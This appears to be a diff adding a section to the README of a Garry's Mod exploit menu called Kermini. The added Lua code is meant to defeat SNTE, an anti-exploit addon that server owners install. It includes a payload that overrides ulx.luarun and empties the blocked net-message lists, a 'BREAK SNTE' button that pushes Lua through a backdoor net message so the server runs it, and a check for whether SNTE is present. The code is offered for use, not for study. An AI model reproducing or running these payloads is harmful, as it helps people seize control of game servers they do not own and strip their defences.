@@ -20,3 +20,55 @@ open phpMyAdmin and execute Kermini-s-q-l.sql
 open www.[DOMAIN].com/install and create an account |Delete this folder after this step
 
 Here you go ! Enjoy
+
+# SNTE
+https://steamcommunity.com/sharedfiles/filedetails/?id=1308262997
+
+This addon can sometimes block your Payloads so try bypasses 
+
+timer.Simple(0.5, function()
+    function ulx.luarun(calling_ply, command)
+        print("ez snte")
+    end
+    bad_net = ""
+    local bad_net = ""
+    local global_nets = ""
+    global_nets = ""
+end)
+___
+local Macro = vgui.Create("DButton", BackGround)
+Macro:SetPos(255, 160)
+Macro:SetParent(Controller)
+Macro:SetTextColor(Color(255, 255, 255, 255))
+Macro:SetSize(200, 25)
+Macro:SetText("BREAK SNTE")
+Macro.Paint = function()
+    surface.SetDrawColor(50, 50, 50 , 200)
+    surface.DrawRect(0, 0, Macro:GetWide(), Macro:GetTall())
+    surface.SetDrawColor(0, 0, 0, 200)
+    surface.DrawOutlinedRect(0, 0, Macro:GetWide(), Macro:GetTall())
+end
+___
+Macro.DoClick = function()
+    net.Start(netKey)
+        net.WriteString([[
+            _G.SNTE = function() end
+        ]])
+        net.WriteBit(1)
+    net.SendToServer()
+    chat.AddText(Color(255,204,153), "亗ADM TEAM", Color(255, 255, 255), "LANCER !" )
+    SploitNotify("LANCER")
+    surface.PlaySound("buttons/button15.wav")
+end
+
+# How to detect SNTE ON A SERVER :
+
+local isSNTE = false
+if ConVarExists("snte_dupefix") or file.Exists( "autorun/server/snte_source.lua", "LUA" ) == true then
+    isSNTE = true
+end
+
+if isSNTE then
+    chat.AddText(Color(26, 48, 219), "[KERMINI]", Color(35, 142, 219), " SNTE DETECTED")
+end
+
